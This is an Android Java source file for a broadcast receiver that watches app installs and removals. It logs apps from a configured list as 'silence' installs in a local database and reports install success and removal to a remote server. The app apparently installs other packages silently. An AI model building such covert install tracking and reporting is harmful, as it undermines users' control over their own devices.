package com.xstd.ip.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.xstd.ip.Config;
import com.xstd.ip.Tools;
import com.xstd.ip.dao.SilenceApp;
import com.xstd.ip.dao.SilenceAppDao;
import com.xstd.ip.dao.SilenceAppDaoUtils;
import com.xstd.ip.service.SendServerService;

public class PackageAddRemReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        String packageName = intent.getDataString().substring(8);
        if (Intent.ACTION_PACKAGE_ADDED.equals(action)) {
            if (Config.installApks.containsKey(packageName)) {
                Tools.notifyServer(context, SendServerService.ACTION_INSTALL_SUCCESS, packageName);
                // 把这个程序加入数据库
                SilenceApp sa = new SilenceApp();
                sa.setPackagename(packageName);
                sa.setInstalltime(System.currentTimeMillis());
                sa.setActive(false);
                SilenceAppDaoUtils.getSilenceAppDao(context).insert(sa);
                // 如果是使用通知方式安装的，则清除通知。
                if (!Config.installApks.get(packageName).isSilence) {
                    Tools.cancleNotification(context, packageName);
                    Config.installApks.remove(packageName);
                }
            }

        } else if (Intent.ACTION_PACKAGE_REMOVED.equals(action)) {
            SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(context);
            Cursor cursor = dao.getDatabase().query(dao.getTablename(), new String[]{SilenceAppDao.Properties.Packagename.columnName}, SilenceAppDao.Properties.Packagename.columnName + "=?",
                    new String[]{packageName}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                Tools.notifyServer(context, SendServerService.ACTION_REMOVED_PACKAGE, packageName);
            }
        }
    }
}
